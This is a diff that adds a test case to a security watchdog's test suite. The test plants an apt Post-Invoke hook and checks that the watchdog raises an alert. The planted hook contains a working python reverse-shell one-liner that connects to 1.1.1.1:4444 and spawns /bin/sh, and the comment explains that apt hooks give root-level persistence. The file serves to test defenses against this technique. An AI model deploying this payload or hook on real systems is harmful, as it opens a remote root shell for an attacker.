@@ -297,3 +297,20 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on apt hook surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the apt-
+    # transaction-trigger root-exec persistence surface (T1546 —
+    # apt hooks run AS ROOT on every package install/upgrade/
+    # remove — operator's routine apt upgrade fires the planted
+    # python rev-shell).
+    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'DPkg::Post-Invoke {"python -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\"";};\n' > "${HOOK}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
